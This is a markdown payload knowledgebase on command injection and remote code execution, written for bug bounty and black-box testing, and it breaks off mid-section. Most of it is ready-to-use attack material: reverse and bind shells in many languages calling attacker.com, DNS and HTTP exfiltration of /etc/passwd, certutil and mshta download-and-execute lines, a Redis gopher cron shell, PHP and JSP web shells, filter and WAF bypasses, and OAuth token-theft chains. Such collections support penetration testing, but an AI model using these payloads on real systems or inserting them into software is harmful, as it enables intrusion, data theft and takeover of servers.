# Command Injection & RCE Knowledgebase
## A Research-Grade Resource for Advanced Bug Bounty Hunting & Black-Box Testing

> **Version**: 2026.05.24 | **Sources**: PortSwigger Research, PayloadsAllTheThings, HackTricks, OWASP, ProjectDiscovery, GTFOBins, LOLBAS, and 30+ linked resources

---

## Table of Contents

1. [Basics](#basics)
2. [Command Injection Theory](#command-injection-theory)
3. [Shell Parsing Internals](#shell-parsing-internals)
4. [Command Injection Payloads](#command-injection-payloads)
5. [Blind RCE Payloads](#blind-rce-payloads)
6. [Time-Based RCE Payloads](#time-based-rce-payloads)
7. [OOB RCE Payloads](#oob-rce-payloads)
8. [Linux Command Injection Payloads](#linux-command-injection-payloads)
9. [Windows Command Injection Payloads](#windows-command-injection-payloads)
10. [Environment Variable Bypasses](#environment-variable-bypasses)
11. [Whitespace Bypasses](#whitespace-bypasses)
12. [Blacklist Bypasses](#blacklist-bypasses)
13. [Shell Metacharacter Payloads](#shell-metacharacter-payloads)
14. [Request Smuggling + RCE Chains](#request-smuggling--rce-chains)
15. [SSRF + RCE Chains](#ssrf--rce-chains)
16. [File Upload + RCE Chains](#file-upload--rce-chains)
17. [Deserialization + RCE Chains](#deserialization--rce-chains)
18. [Cache Poisoning + RCE Chains](#cache-poisoning--rce-chains)
19. [OAuth + RCE Chains](#oauth--rce-chains)
20. [Parser Confusion Payloads](#parser-confusion-payloads)
21. [Shell Parser Quirks](#shell-parser-quirks)
22. [Browser Quirks](#browser-quirks)
23. [Gadget Chains](#gadget-chains)
24. [Real World Case Studies](#real-world-case-studies)
25. [Fuzzing Payloads](#fuzzing-payloads)
26. [Automation Workflows](#automation-workflows)
27. [Recon Methodology](#recon-methodology)
28. [Nuclei Templates](#nuclei-templates)
29. [Tools and Scanners](#tools-and-scanners)
30. [Advanced Research](#advanced-research)
31. [Bug Bounty Writeups](#bug-bounty-writeups)
32. [Payload Collections](#payload-collections)
33. [WAF Bypasses](#waf-bypasses)
34. [Detection Techniques](#detection-techniques)
35. [References](#references)

---

## Basics

### What is OS Command Injection?

OS command injection (also known as shell injection) allows an attacker to execute operating system commands on the server running an application. It typically allows full compromise of the application and its data, and can be leveraged to pivot to other systems within the organization's infrastructure.

**Key distinction from Code Injection**:
- **Code Injection**: Attacker adds their own code that is executed by the application
- **Command Injection**: Attacker extends the default functionality of the application to execute arbitrary system commands

### Vulnerability Contexts

Command injection occurs when applications pass unsafe user-supplied data (forms, cookies, HTTP headers, URL parameters) to a system shell without proper validation.

**Common vulnerable patterns**:
```php
// PHP - Direct system call
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);

// C - Unsafe string concatenation
strcat(command, argv[1]);
system(command);

// Java - Runtime.exec() (note: NOT the same as C system())
Runtime.getRuntime().exec("ping -c 4 " + userInput);
```

**Critical note on Java Runtime.exec()**: Unlike C's `system()`, Java's `Runtime.exec()` does NOT invoke the shell. It splits the string into an array and executes the first word. Shell metacharacters (`;`, `&&`, `|`, etc.) are treated as literal arguments, not command separators. However, if the command string is passed to `/bin/sh -c`, it becomes vulnerable.

### Initial System Recon Commands

| Purpose | Linux | Windows |
|---------|-------|---------|
| Current user | `whoami` | `whoami` |
| OS info | `uname -a` | `ver` |
| Network config | `ifconfig` / `ip addr` | `ipconfig /all` |
| Network connections | `netstat -an` / `ss -tulpn` | `netstat -an` |
| Running processes | `ps -ef` / `ps aux` | `tasklist` |
| Current directory | `pwd` | `cd` |
| Environment | `env` / `printenv` | `set` |

---

## Command Injection Theory

### Injection Points

1. **Direct command execution**: User input appended to a command string
2. **Argument injection**: User input passed as arguments to a command
3. **Environment variable manipulation**: User-controlled env vars affect command behavior
4. **Path injection**: User-controlled PATH leads to execution of attacker-controlled binaries

### Shell Command Separators

**Cross-platform (Windows & Unix)**:
- `&` - Background execution, command separator
- `&&` - AND (execute second only if first succeeds)
- `|` - Pipe (output of first to input of second)
- `||` - OR (execute second only if first fails)

**Unix-only**:
- `;` - Sequential execution
- Newline (`\n`, `0x0a`) - Command terminator

**Inline execution (Unix)**:
- `` `command` `` - Backtick substitution
- `$(command)` - Command substitution (preferred, nestable)

### Quoted Context Injection

When user input appears within quotation marks in the original command, you must terminate the quoted context before injecting:

```
Original: command "USER_INPUT"
Payload:  "; cat /etc/passwd; #
Result:   command ""; cat /etc/passwd; #"
```

---

## Shell Parsing Internals

### How Shells Parse Commands

1. **Word splitting**: The shell splits input into words based on IFS (Internal Field Separator)
2. **Quote removal**: Single (`'`) and double (`"`) quotes are processed
3. **Parameter expansion**: `$VAR`, `${VAR}`, `$()` are expanded
4. **Command substitution**: Backticks and `$()` are evaluated
5. **Arithmetic expansion**: `$((expr))`
6. **Filename expansion (globbing)**: `*`, `?`, `[...]`
7. **Redirection processing**: `<`, `>`, `>>`, `<<`, `<<<`

### IFS (Internal Field Separator)

Default value: space, tab, newline (` \t\n`)

```bash
# IFS can be used to bypass space filters
cat${IFS}/etc/passwd
ls${IFS}-la
```

### Brace Expansion

```bash
{cat,/etc/passwd}  # Expands to: cat /etc/passwd
{,ip,a}            # Expands to: ip a
{l,-lh}s           # Expands to: ls -lhs
```

### ANSI-C Quoting

```bash
X=$'uname\x20-a' && $X
# \x20 is hex for space
```

### Tilde Expansion

```bash
echo ~+   # Current working directory
echo ~-   # Previous working directory
```

---

## Command Injection Payloads

### Basic Detection Payloads

```bash
# Echo-based detection (in-band)
& echo aiwefwlguh &
; echo aiwefwlguh ;
| echo aiwefwlguh |
` echo aiwefwlguh `
$(echo aiwefwlguh)

# Time-based detection (blind)
& ping -c 10 127.0.0.1 &
; sleep 10 ;
| sleep 10 |
```

### Standard Injection Payloads

```bash
# Unix basic
; cat /etc/passwd
| cat /etc/passwd
` cat /etc/passwd `
$(cat /etc/passwd)

# Windows basic
& dir
| dir
; dir C:&& type C:\Windows\win.ini

# URL-encoded variants
%3Bcat%20/etc/passwd        # ;cat /etc/passwd
%7Cid                        # |id
%0Acat%20/etc/passwd         # newline + cat
%0A/usr/bin/id%0A            # newline + id
```

### Polyglot Payloads

Polyglot payloads work across multiple contexts (single quotes, double quotes, no quotes):

```
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

# Context inside commands with single and double quote:
echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
```

Advanced polyglot:
```
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

### Argument Injection Vectors

When you can only append arguments (not full command injection):

```bash
# Chrome - GPU launcher injection
chrome '--gpu-launcher="id>/tmp/foo"'

# SSH - ProxyCommand injection
ssh '-oProxyCommand="touch /tmp/foo"' foo@foo

# psql - Output redirection
psql -o'|id>/tmp/foo'

# curl - File write
# -o, --output <file>  Write to file instead of stdout
curl http://attacker.com/ -o webshell.php

# wget - File write
wget http://attacker.com/shell.php -O /var/www/html/shell.php
```

**WorstFit technique**: Using fullwidth characters that get normalized to ASCII:
```
Payload: ＂ --use-askpass=calc ＂
# Uses U+FF02 (fullwidth double quote) instead of U+0022
```

---

## Blind RCE Payloads

### Detection via Time Delays

```bash
# Linux - ping with count
& ping -c 10 127.0.0.1 &
; ping -c 10 127.0.0.1 ;
| ping -c 10 127.0.0.1 |
` ping -c 10 127.0.0.1 `

# Windows - ping with count
& ping -n 10 127.0.0.1 &
| ping -n 10 127.0.0.1 |

# Sleep-based (more reliable)
; sleep 10 ;
& sleep 10 &
| sleep 10 |
$(sleep 10)
` sleep 10 `

# PHP-based delays
; php -r 'sleep(10);' ;
${@sleep(10)}
```

### Output Redirection

```bash
# Redirect to web root (if known)
& whoami > /var/www/static/whoami.txt &
; cat /etc/passwd > /var/www/html/passwd.txt ;
| id > /usr/share/nginx/html/id.txt |

# Windows
& whoami > C:\inetpub\wwwroot\whoami.txt &
| type C:\Windows\win.ini > C:\inetpub\wwwroot\win.ini |
```

### DNS-based (OAST) Detection

```bash
# Basic DNS lookup
& nslookup attacker.com &
; nslookup attacker.com ;
| nslookup attacker.com |

# Data exfiltration via DNS
& nslookup `whoami`.attacker.com &
; nslookup $(whoami).attacker.com ;
| nslookup `cat /etc/passwd | head -1 | cut -c1-10`.attacker.com |

# Using xxd for longer data
& for i in $(ls /); do host "$i.attacker.com"; done &
```

---

## Time-Based RCE Payloads

### Character-by-Character Exfiltration

```bash
# Extract first character of whoami, compare with 's', sleep if correct
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi

# Binary search approach (more efficient)
time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
# No delay = incorrect character

# Full extraction loop
for i in $(seq 1 10); do
  for c in {a..z}; do
    if [ $(whoami|cut -c $i) == $c ]; then sleep 1; fi
  done
done
```

### Conditional Delays

```bash
# File existence check
[ -f /etc/passwd ] && sleep 5

# Permission check
[ -r /etc/shadow ] && sleep 5

# String in file
grep -q "root" /etc/passwd && sleep 5
```

---

## OOB RCE Payloads

### DNS Exfiltration

```bash
# Basic
nslookup $(whoami).burpcollaborator.net
dig $(whoami).burpcollaborator.net

# Chunked data (limited by DNS label length ~63 chars)
for i in $(cat /etc/passwd | base64 | fold -w50); do
  nslookup "$i.burpcollaborator.net"
done

# Using xxd for hex encoding
xxd -p /etc/passwd | fold -w50 | while read line; do
  nslookup "$line.burpcollaborator.net"
done
```

### HTTP Exfiltration

```bash
# GET request with data
curl http://attacker.com/$(whoami)
wget http://attacker.com/$(cat /etc/passwd | base64)

# POST with data
curl -d "$(cat /etc/passwd)" http://attacker.com/exfil
wget --post-data="$(whoami)" http://attacker.com/exfil
```

### Interactsh Integration

```bash
# Using interactsh for OOB detection
nslookup $(whoami).oastify.com
curl http://$(whoami).oastify.com

# ProjectDiscovery's interactsh
# https://github.com/projectdiscovery/interactsh
```

---

## Linux Command Injection Payloads

### File Reading

```bash
# Standard
cat /etc/passwd
head /etc/passwd
tail /etc/passwd
less /etc/passwd
more /etc/passwd
nl /etc/passwd
od /etc/passwd
xxd /etc/passwd
hexdump /etc/passwd

# Without 'cat' command
while read line; do echo $line; done < /etc/passwd
$(</etc/passwd)
```

### Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Netcat traditional
nc -e /bin/sh attacker.com 4444
nc -e /bin/bash attacker.com 4444

# Netcat without -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 4444 > /tmp/f

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# PHP
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Bind Shells

```bash
# Netcat
nc -lvp 4444 -e /bin/bash

# Python
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);"
```

### GTFOBins Escalation

When you have limited command execution, use GTFOBins to escalate:

```bash
# sudo privileges
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo less /etc/hosts  # then !/bin/sh
sudo man man  # then !/bin/sh
sudo nmap --interactive  # then !/bin/sh

# SUID binaries
./sudoedit -s 'Y\n!/bin/sh\n'
```

---

## Windows Command Injection Payloads

### File Reading

```cmd
# Standard
type C:\Windows\win.ini
type C:\Users\%USERNAME%\Desktop\file.txt
more C:\Windows\win.ini

# Registry
cmd /c reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"

# Directory listing
dir C:\
dir /s C:\Users\
tree C:\
```

### Reverse Shells

```cmd
# PowerShell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PowerShell one-liner (base64 encoded)
powershell -e <base64_encoded_command>

# Python (if installed)
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('attacker.com',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe','-i']);"
```

### LOLBAS Execution

```cmd
# Certutil download and execute
certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe && shell.exe

# Bitsadmin download
bitsadmin /transfer n http://attacker.com/shell.exe C:\Users\Public\shell.exe

# MSHTA execute remote HTA
mshta http://attacker.com/payload.hta

# Regsvr32 SCT bypass
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# Rundll32 execute JavaScript
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload.sct")'
```

---

## Environment Variable Bypasses

### IFS Substitution

```bash
# ${IFS} expands to space/tab/newline
cat${IFS}/etc/passwd
ls${IFS}-la
wget${IFS}http://attacker.com/shell${IFS}-O${IFS}/tmp/shell
```

### Windows Environment Substrings

```cmd
# %VARIABLE:~start,length% syntax for substring operations
ping%CommonProgramFiles:~10,-18%127.0.0.1
# CommonProgramFiles = C:\Program Files\Common Files
# ~10,-18 extracts space character

ping%PROGRAMFILES:~10,-5%127.0.0.1
# PROGRAMFILES = C:\Program Files
# ~10,-5 extracts space
```

### PATH Manipulation

```bash
# If application uses relative paths
export PATH=/tmp:$PATH
cp /bin/bash /tmp/make
# When app calls 'make', it executes /tmp/make (bash)
```

### LD_PRELOAD / LD_LIBRARY_PATH

```bash
# If you can control environment variables
LD_PRELOAD=/tmp/evil.so ./vulnerable_app
```

---

## Whitespace Bypasses

### Without Space Character

```bash
# IFS substitution
cat${IFS}/etc/passwd

# Brace expansion
{cat,/etc/passwd}

# Input redirection
cat</etc/passwd
sh</dev/tcp/127.0.0.1/4242

# Tab character (URL-encoded %09)
;ls%09-al%09/home

# Newline
original_cmd
cat/etc/passwd

# Backslash newline (line continuation)
cat /et\
c/pa\
sswd

# URL-encoded backslash newline
cat%20/et%5C%0Ac/pa%5C%0Asswd
```

### Windows Whitespace Bypasses

```cmd
# Using commas (in some contexts)
cmd,/c,whoami

# Using environment variables
%COMSPEC%/cwhoami
```

---

## Blacklist Bypasses

### Character Filter Bypasses

```bash
# Without slash and backslash - Linux bash
# Using ${HOME:0:1} to get /
echo ${HOME:0:1}
cat ${HOME:0:1}etc${HOME:0:1}passwd

# Using tr to generate /
echo . | tr '!-0' '"-1'
tr '!-0' '"-1' <<< .
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd

# Hex encoding
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`

# xxd for hex decoding
xxd -r -p <<< 2f6574632f706173737764
cat `xxd -r -p <<< 2f6574632f706173737764`

# ANSI-C quoting
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'; cat $abc
```

### Quote-based Bypasses

```bash
# Single quote breaking
w'h'o'am'i
wh''oami
'w'hoami

# Double quote breaking
w"h"o"am"i
wh""oami
"wh"oami

# Backtick breaking (empty command substitution)
wh``oami
```

### Variable Expansion Bypasses

```bash
# Using $@ (empty if no arguments)
who$@ami
echo whoami|$0

# Using $()
who$()ami
who$(echo am)i
who`echo am`i

# Wildcard bypass
/???/??t /???/p??s??

# Variable manipulation
test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

### Case Randomization (Windows)

```cmd
# Windows is case-insensitive
wHoAmi
DiR
IpCoNfIg
```

---

## Shell Metacharacter Payloads

### Complete Metacharacter Reference

```
;   - Command separator (Unix)
&   - Background / command separator (both)
|   - Pipe (both)
||  - OR (both)
&&  - AND (both)
`   - Command substitution (Unix)
$() - Command substitution (Unix)
<   - Input redirect (both)
>   - Output redirect (both)
<<  - Here-document (Unix)
<<< - Here-string (Unix)
*   - Wildcard (both)
?   - Single char wildcard (both)
[ ] - Character class (both)
{ } - Brace expansion (Unix)
~   - Tilde expansion (Unix)
#   - Comment (Unix)
\   - Escape / line continuation (Unix)
%   - Variable (Windows)
^   - Escape (Windows)
```

### Chaining Examples

```bash
# Sequential
command1; command2; command3

# Conditional
command1 && command2 || command3

# Pipeline with command substitution
cat /etc/passwd | grep root | wc -l

# Background execution
nohup sleep 120 > /dev/null &

# Remove trailing arguments
command -- -injected-arg  # -- stops option processing
```

---

## Request Smuggling + RCE Chains

### HTTP Desync Attack Fundamentals

HTTP request smuggling exploits disagreements between front-end and back-end servers about where HTTP requests end. This allows attackers to prepend malicious content to legitimate requests.

**Core desync types**:
- **CL.TE**: Front-end uses Content-Length, back-end uses Transfer-Encoding
- **TE.CL**: Front-end uses Transfer-Encoding, back-end uses Content-Length
- **TE.TE**: Both use Transfer-Encoding, but disagree on header validity
- **CL.0**: Back-end ignores Content-Length entirely (treats as 0)
- **H2.CL**: HTTP/2 to HTTP/1.1 downgrade, CL header added unexpectedly

### Classic CL.TE Desync

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1
Host: example.com
```

### TE.CL Desync

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 3
Transfer-Encoding: chunked

6
PREFIX
0

POST / HTTP/1.1
Host: example.com
```

### Request Smuggling + RCE Chain

1. **Detect** desync using timeout-based detection:
```http
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 41

Z
Q
```
If front-end uses CL and back-end uses TE, back-end waits forever for chunk size -> timeout.

2. **Confirm** socket poisoning:
```http
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: zchunked

17
=x&q=smuggling&x=
0
GET /404 HTTP/1.1
Foo: b
```

3. **Exploit** with stored request + RCE:
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 142
Transfer-Encoding: chunked
Transfer-Encoding: x

0

POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

bio=curl attacker.com/$(whoami)
0
GET / HTTP/1.1
Host: example.com
```

### Browser-Powered Desync (Client-Side Desync)

Turn victim's browser into a desync delivery platform:

```javascript
// CSD attack via fetch()
fetch('https://example.com/', {
    method: 'POST',
    body: "GET /hopefully404 HTTP/1.1\r\nX: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://example.com/'
})
```

### Pause-Based Desync

Exploiting server timeout implementations:
1. Send headers promising a body
2. Wait for server timeout (e.g., Varnish 15s)
3. Server responds but leaves connection open
4. Send body -> interpreted as new request

---

## SSRF + RCE Chains

### OAuth Dynamic Client Registration SSRF

OAuth registration endpoints accept URL parameters that are fetched server-side:

```http
POST /connect/register HTTP/1.1
Host: server.example.com
Content-Type: application/json

{
  "redirect_uris": ["https://client.example.org/callback"],
  "logo_uri": "http://internal.service/admin",
  "jwks_uri": "http://169.254.169.254/latest/meta-data/",
  "sector_identifier_uri": "http://internal.api/secret",
  "request_uris": ["http://attacker.com/malicious.jwt"]
}
```

**SSRF triggers**:
- `logo_uri`: Fetched when displaying client approval page
- `jwks_uri`: Fetched when validating JWT client assertions
- `sector_identifier_uri`: Fetched during authorization flow
- `request_uri`: Fetched at start of authorization process

### Cloud Metadata Extraction via SSRF

```bash
# AWS IMDS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google"

# Azure
curl http://169.254.169.254/metadata/instance?api-version=2017-08-01 -H "Metadata: true"
```

### SSRF to RCE via Protocol Smuggling

```bash
# Gopher protocol for Redis
# If Redis is exposed internally, SSRF to gopher:// can write to crontab
gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20shell%20%22%2A%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker%2F4444%200%3E%261%22%0D%0ACONFIG%20SET%20dir%20%2Fvar%2Fspool%2Fcron%2F%0D%0ACONFIG%20SET%20dbfilename%20root%0D%0ASAVE%0D%0A

# FTP protocol for file write
dict://127.0.0.1:6379/d:$'
config set dir /var/www/html
config set dbfilename shell.php
set x "<?php system($_GET['cmd']); ?>"
save
':6379
```

---

## File Upload + RCE Chains

### Web Shell Upload

```php
# PHP shell
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php eval($_POST['code']); ?>

# ASP shell
<% eval request("cmd") %>

# JSP shell
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### Extension Bypass Techniques

```
# Double extension
shell.php.jpg
shell.php%00.jpg        # Null byte (legacy PHP)
shell.php;.jpg
shell.php.foo.bar

# Case variation
shell.PHP
shell.pHp

# Alternative extensions
shell.phtml
shell.php3
shell.php4
shell.php5
shell.shtml
shell.inc
shell.jspx
shell.jsw
shell.jsv
shell.jspf
```

### Content-Type Bypass

```http
# Force PHP execution despite image content-type
Content-Type: image/jpeg

# Using GIF magic bytes with PHP code
GIF89a;<?php system($_GET['cmd']); ?>
```

### Path Traversal in Upload

```
# Upload to parent directory
../../shell.php
../../../var/www/html/shell.php
..\..\shell.php
```

### ImageMagick / Ghostscript RCE

```bash
# ImageMagick policy.xml bypass (if outdated)
# MVG (Magick Vector Graphics) payload
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/"|bash -i >& /dev/tcp/attacker/4444 0>&1")'
pop graphic-context

# Ghostscript -dSAFER bypass (CVE-2018-16509)
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1') currentdevice putdeviceprops
setpagedevice
```

---

## Deserialization + RCE Chains

### PHP Deserialization

```php
# PHP Object Injection
# Vulnerable: unserialize($_GET['data'])

# Common gadgets
# - __destruct() methods
# - __wakeup() methods
# - __toString() methods

# Example payload structure
O:4:"Test":1:{s:4:"data";s:26:"<?php system('id'); ?>";};

# PHAR deserialization via phar:// wrapper
phar://uploads/image.jpg/test.txt
# If file_exists('phar://...') is called, PHAR metadata is deserialized
```

### Java Deserialization

```java
// ysoserial payloads
// Common gadget chains:
// - CommonsCollections1-7
// - Spring1-2
// - Hibernate1
// - JBossInterceptors1
// - JSON1
// - Rome
// - Clojure
// - JavassistWeld1
// - Jython1
// - MozillaRhino1-2
// - Myfaces1-2
// - Wicket1

// URLDNS gadget (for detection)
// Triggers DNS lookup to verify deserialization
```

### .NET Deserialization

```csharp
// ObjectDataProvider gadget
// ExpandedWrapper gadget
// Json.Net TypeNameHandling.Auto vulnerability
```

### Python Deserialization

```python
# pickle.loads() - arbitrary code execution
# yaml.load() - if Loader is not SafeLoader
# PyYAML: yaml.load(data, Loader=yaml.FullLoader)  # Still dangerous
```

### Node.js Deserialization

```javascript
// node-serialize / serialize-to-js
// eval() based deserialization
// __proto__ pollution to RCE
```

---

## Cache Poisoning + RCE Chains

### Web Cache Poisoning Fundamentals

**Cache keys** vs **unkeyed inputs**:
- Cache key: Method, path, query string, Host header
- Unkeyed: Most other headers, cookies, body content

**Goal**: Cause a harmful response that gets saved in cache and served to other users.

### Unkeyed Header XSS to RCE

```http
GET /en?cb=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: canary

# Response contains:
<meta property="og:image" content="https://canary/cms/social.png" />

# Exploit:
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."><script>alert(1)</script>
```

### Cache Key Normalization Exploits

```http
# Port removal from cache key
GET / HTTP/1.1
Host: redacted.com:1337

# Response cached for Host: redacted.com (without port)
# Can redirect all traffic to malicious port
```

### Cache Parameter Cloaking

```http
# Akamai akamai-transform parameter exclusion
GET /en?x=1?akamai-transform=payload-goes-here HTTP/1.1
Host: redacted.com

# Cache key: /en?x=1
# Application sees: x=1 AND akamai-transform=payload
```

### Fat GET to RCE

```http
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim

# Cache key includes GET params but not body
# Body parameters affect application logic but not cache key
```

---

## OAuth + RCE Chains

### redirect_uri Session Poisoning

**Vulnerability**: OAuth servers store `redirect_uri` in session during multi-step flows. Race conditions allow session poisoning.

**Attack flow**:
1. Victim visits attacker's page
2. Page redirects to OAuth authorization with **trusted** `client_id`
3. Background request sends **untrusted** `client_id` with malicious `redirect_uri`
4. Session gets poisoned with malicious `redirect_uri`
5. Victim approves trusted client -> token sent to attacker's `redirect_uri`

```http
# Step 1: Trusted authorization request
/authorize?client_id=TRUSTED&response_type=code&redirect_uri=http://trusted.com/callback

# Step 2: Poisoning request (background)
/authorize?client_id=UNTRUSTED&response_type=code&redirect_uri=http://attacker.com/steal

# Step 3: User approves trusted client
# Token/code is sent to http://attacker.com/steal
```

### Mass Assignment in OAuth Confirmation

```http
# MITREid Connect vulnerability
# /oauth/confirm_access takes parameters from URL via @ModelAttribute

/oauth/confirm_access?client_id=TRUSTED&response_type=code&redirectUri=http://attacker.com/steal

# redirectUri (camelCase) binds to AuthorizationRequest.redirectUri
# Bypasses validation on /authorize endpoint
```

### WebFinger User Enumeration

```http
GET /.well-known/webfinger?resource=http://x/admin&rel=http://openid.net/specs/connect/1.0/issuer HTTP/1.1

# Enumerates valid usernames
# Can be chained with other attacks
```

---

## Parser Confusion Payloads

### HTTP/2 Downgrade Confusion

```http
# AWS ALB vulnerability: HTTP/2 request without Content-Length
# ALB adds Transfer-Encoding: chunked during downgrade

# HTTP/2 request
:method: POST
:path: /
:authority: redacted

# Downgraded to HTTP/1.1:
POST / HTTP/1.1
Host: redacted
Transfer-Encoding: chunked
X

# Body treated as chunked -> request smuggling
```

### Header Parsing Discrepancies

```http
# Transfer-Encoding obfuscation techniques:
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding\n: chunked
```

### URL Parsing Differences

```
# Different parsers handle URLs differently:
http://example.com@attacker.com/path
http://attacker.com:80@example.com/path
http://attacker.com%2F..%2Fexample.com/path
http://example.com\.attacker.com/path
```

---

## Shell Parser Quirks

### Bash-specific Behaviors

```bash
# $0 expansion in interactive shell
echo whoami | $0

# Here-string without spaces
bash<<<"whoami"

# Process substitution
cat <(whoami)

# Co-processes
bash -c 'coproc { whoami; }'

# Special builtins vs regular builtins
# Special builtins exit on error even with set +e
```

### Sh vs Bash Differences

```bash
# [[ ]] vs [ ]
# $() vs ``
# ${var//pattern/replacement}
# Brace expansion: {a,b,c}
# Process substitution: <()
```

### Windows CMD Quirks

```cmd
# Multiple commands with &
cmd /c whoami & dir

# Escaping with ^
cmd /c whoami ^& dir

# Variable expansion in for loops
for /f %i in ('whoami') do @echo %i

# Using findstr for regex
whoami | findstr /i "admin"
```

### PowerShell Execution Policies

```powershell
# Bypass execution policy
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"

# Encoded command
powershell -e <base64>
```

---

## Browser Quirks

### Mixed Content Handling

```
# Internet Explorer: Mixed-content protection can be bypassed
# Safari: Auto-upgrades HTTP to HTTPS if in HSTS cache
# Chrome/Firefox: Block mixed content by default
```

### Connection Pool Behavior

```javascript
// Chrome has separate connection pools:
// - With cookies (credentials: 'include')
// - Without cookies

fetch('https://example.com/', {
    credentials: 'include'  // Use 'with-cookies' pool
});

// Navigations use 'with-cookies' pool
location = 'https://example.com/';
```

### Stacked Response Problem

Browsers discard connections if they receive more response data than expected. This affects HEAD-based desync attacks.

**Mitigation**: Use cache-busters to delay responses:
```javascript
fetch('https://example.com/assets', {
    method: 'POST',
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\n...`,
    credentials: 'include',
    mode: 'cors'
}).catch(() => {
    location = 'https://example.com/'
});
```

### CORS Error Handling

```javascript
